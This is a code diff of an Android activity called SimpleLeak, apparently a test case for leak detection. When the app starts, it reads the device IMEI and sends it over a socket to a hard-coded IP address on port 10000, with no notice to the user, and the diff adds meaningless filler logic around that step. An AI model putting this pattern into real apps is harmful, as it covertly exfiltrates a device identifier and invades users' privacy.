@@ -14,40 +14,51 @@ import android.widget.Toast;
 import java.io.IOException;
 import java.io.OutputStreamWriter;
 import java.net.Socket;
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
 
 public class SimpleLeak extends AppCompatActivity {
     public final static String TAG = SimpleLeak.class.getName();
+
+    public int blah = 2;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_simple_leak);
 
-
         IMEI_LEAK(null);
+
+        blah = 5;
+
+        Log.d(TAG, "" + getData(15));
 
     }
 
+
+    private int getData(int x){
+        return 56 + x;
+    }
+
     public void IMEI_LEAK(View v){
-        if (ContextCompat.checkSelfPermission(this ,
-                Manifest.permission.READ_PHONE_STATE)
-                != PackageManager.PERMISSION_GRANTED){
-            Toast.makeText(this, "Phone state permissions required!", Toast.LENGTH_SHORT).show();
-        } else {
-            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-            final String IMEI = telephonyManager.getDeviceId();
 
+        Thread t = new Thread(){
+            public void run(){
+                try {
 
-            Log.d(TAG, IMEI);
-            Toast.makeText(this, IMEI, Toast.LENGTH_SHORT).show();
+                    Context ctx = getApplicationContext();
+                    TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
-            Thread t = new Thread(){
+                    if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED){
+                        Toast.makeText(ctx, "Phone state permissions required!", Toast.LENGTH_SHORT).show();
 
-                public void run(){
-                    try {
-                        Socket s = new Socket("155.68.60.155", 10000);
+                    } else {
+
+                        String IMEI = telephonyManager.getDeviceId();
+
+                        String IMEIAndMore = IMEI + "user1";
+
+                        //Log.d(TAG, IMEI);
+
+                        Socket s = new Socket("192.168.1.131", 10000);
                         OutputStreamWriter out = new OutputStreamWriter(s.getOutputStream());
                         out.write(IMEI, 0, IMEI.length());
                         out.flush(); // actually write / send
@@ -56,15 +67,24 @@ public class SimpleLeak extends AppCompatActivity {
                         out.close();
                         s.close();
 
-                    } catch (IOException ioe){
-                        ioe.printStackTrace();
+                        int a = blah + 1;
+                        blah = 3;
 
+
+                        if(blah != 0){
+                            Log.d(TAG, "" + getData(0));
+                        }
                     }
+
+                } catch (IOException ioe){
+                    ioe.printStackTrace();
+
                 }
+            }
 
-            };
-            t.start();
+        };
 
-        }
+        t.start();
     }
 }
+
